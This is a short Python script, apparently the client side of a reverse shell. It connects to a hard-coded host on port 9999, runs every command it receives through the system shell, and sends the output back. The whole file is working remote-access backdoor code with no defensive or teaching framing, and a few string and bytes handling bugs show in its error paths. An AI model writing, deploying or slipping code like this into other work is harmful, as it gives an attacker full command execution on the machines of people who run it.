import os
import socket
import subprocess
import sys


s = socket.socket()
host = "192.168.1.15"
port = 9999
s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:].decode("utf-8") == "cd":
        try:
            os.chdir(os.path.dirname(sys.argv[0]))
        except OSError:
            s.send("Client is already in starting directory!" + str(os.getcwd()) + "> ")
    elif data[:2].decode("utf-8") == "cd":
        try:
            os.chdir(data[3:].decode("utf-8"))
        except OSError:
            s.send("Directory does not exist: " + str.encode(str(OSError) + str(os.getcwd()) + "> "))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes)
        s.send(str.encode(output_str + "\n" + str(os.getcwd()) + "> "))
        print(output_str)
    if data[:].decode("utf-8") == 'killit':
        s.close()

# Closing Connection in case 'Kill' command wasn't issued
s.close()